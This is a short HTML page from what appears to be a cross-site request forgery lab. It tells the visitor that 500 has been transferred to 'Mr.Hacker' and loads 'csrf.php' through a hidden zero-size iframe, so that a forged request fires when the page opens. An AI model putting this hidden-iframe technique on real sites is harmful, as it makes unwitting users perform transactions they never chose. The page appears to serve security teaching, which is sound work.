<html>
<head>
	<title>CSRF Hacked</title>
</head>

</script>
<body>
 <center><h1>Welcome to this page</h1>
 <h2>An Amount of 500 has been transferred to Mr.Hacker on your behalf. Go Back to see your balance :P </h2></center>

	<iframe src="csrf.php" height=0 width=0>
	</iframe>
<a href="Start.php">Back</a>
</body>
</html>